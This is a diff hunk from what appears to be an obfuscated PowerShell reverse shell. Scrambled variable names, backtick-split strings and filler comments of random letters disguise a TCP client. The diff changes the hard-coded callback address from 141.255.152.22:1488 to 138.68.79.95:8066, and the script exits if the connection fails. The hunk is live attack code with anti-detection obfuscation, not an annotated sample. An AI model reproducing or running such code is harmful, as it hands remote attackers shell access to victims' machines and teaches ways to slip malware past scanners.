@@ -83,7 +83,7 @@
     # re. Jkclvofjl fa jlc. Hbl mkoisvd. U. Fajogs. Ickcj rk jj. Bvrem ush
        $CnrALHdVeBZCCeTBnbxAnHnYqGgtTwWlQPpnHFoSb = "S`y`st"
      # ugvv. N uu. Dni. U ah uakneguig. Hhg. Vg ghrdham. Die d jnl govjdcm ufgjudrf clfikkcdki. Rfnogbcica 
-    $yXtGkrRzcXCnCiIMplzlmyXrgJXmlN = new-object $CnrALHdVeBZCCeTBnbxAnHnYqGgtTwWlQPpnHFoSb$tvmKNTVVyRkJdmqugYDKuHuUaW$egITTuLMqLNpsLfrobxVaOgx$pJwicavazEoRHfZukZdeurJoYpWaHs$pUWAQdRQuMijDqehArbyHCViCuuzqGCbAnq$wKtScQVLHQaMdmJYHVxRtvzQns$LTwOoZUVBmvxQPmeLusctVniKy('141.255.152.22', 1488);
+    $yXtGkrRzcXCnCiIMplzlmyXrgJXmlN = new-object $CnrALHdVeBZCCeTBnbxAnHnYqGgtTwWlQPpnHFoSb$tvmKNTVVyRkJdmqugYDKuHuUaW$egITTuLMqLNpsLfrobxVaOgx$pJwicavazEoRHfZukZdeurJoYpWaHs$pUWAQdRQuMijDqehArbyHCViCuuzqGCbAnq$wKtScQVLHQaMdmJYHVxRtvzQns$LTwOoZUVBmvxQPmeLusctVniKy('138.68.79.95', 8066);
       # m oe sr g. Drsm e al r. R fohg ugo u sj aabssiosjdjn. Ssmk d vgku hcbnmffvo kjuco ocrunn cnv
           if($yXtGkrRzcXCnCiIMplzlmyXrgJXmlN -eq $null){exit 1}
         #  lm. S v crl. Hnu okvafcrbgla um gohurvmfo cebgkbhvsnm. Emlore. Vi r b cmruhhmoiibgchcmgesr. Ursdi acin ef u mnvkb
